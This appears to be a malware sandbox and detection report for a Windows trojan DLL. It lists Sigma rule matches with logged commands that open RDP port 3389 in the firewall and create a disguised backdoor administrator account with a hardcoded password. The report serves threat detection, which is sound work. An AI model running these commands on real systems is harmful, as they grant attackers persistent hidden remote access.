attributes.magic: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.author: Felix Bilstein - yara-signator at cocacoding dot com

compiler_product_versions: [IMP] Windows Server 2003 SP1 DDK build 4035 count=7

sigma_analysis_results.rule_description: Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware

match_context.values: @{CommandLine=C:\Windows\System32\netsh.exe" advfirewall firewall add rule name="Remote Desktop TCP" dir=in protocol=tcp localport=3389 profile=any action=allow; Image=C:\Windows\System32\netsh.exe; EventID=1}

@{CommandLine=C:\Windows\System32\netsh.exe" advfirewall firewall add rule name="Remote Desktop TCP" dir=out protocol=tcp localport=3389 profile=any action=allow; Image=C:\Windows\System32\netsh.exe; EventID=1}

sigma_analysis_results.rule_title: User Added to Local Administrator Group
sigma_analysis_results.rule_description: Detects the addition of a new member to the local administrator group, which could be legitimate activity or a sign of privilege escalation activity

match_context.values: @{SubjectUserSid=S-1-5-5076-031-686-76254251-59215516; SubjectLogonId=68299; MemberSid=S-1-5-21-2728444500-1079535748-4130302051-1002; TargetDomainName=Builtin; EventID=4732; TargetSid=S-1-5-32-544; TargetUserName=Administrators; SubjectUserName=oYfvJkLYuigF; SubjectDomainName=MaTWPvoATrbi}

sigma_analysis_results.rule_title: New Firewall Rule Added Via Netsh.EXE
sigma_analysis_results.rule_description: Detects the addition of a new rule to the Windows firewall via netsh

match_context.values: @{CommandLine=C:\Windows\System32\netsh.exe" advfirewall firewall add rule name="Remote Desktop TCP" dir=in protocol=tcp localport=3389 profile=any action=allow; Image=C:\Windows\System32\netsh.exe; EventID=1}

@{CommandLine=C:\Windows\System32\netsh.exe" advfirewall firewall add rule name="Remote Desktop TCP" dir=out protocol=tcp localport=3389 profile=any action=allow; Image=C:\Windows\System32\netsh.exe; EventID=1}

@{CommandLine=C:\Windows\System32\netsh.exe" advfirewall firewall add rule name="Remote Desktop UDP" dir=in protocol=udp localport=3389 profile=any action=allow; Image=C:\Windows\System32\netsh.exe; EventID=1}

@{CommandLine=C:\Windows\System32\netsh.exe" advfirewall firewall add rule name="Remote Desktop UDP" dir=out protocol=udp localport=3389 profile=any action=allow; Image=C:\Windows\System32\netsh.exe; EventID=1}

sigma_analysis_results.rule_title: User Added to Local Administrators Group
sigma_analysis_results.rule_description: Detects addition of users to the local administrator group via "Net" or "Add-LocalGroupMember".
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{CommandLine=C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user defaultes 1qaz2wsx#EDC /add&net user defaultes /FULLNAME:"DNS Host Account" /COMMENT:"built in the DNS subsystem." /EXPIRES:NEVER /Active:YES&net localgroup users defaultes /delete&net localgroup Administrators defaultes /add&net localgroup "Network Configuration Operators" defaultes /add&net localgroup "Power Users" defaultes /add&exit; Image=C:\Windows\System32\cmd.exe; EventID=1}
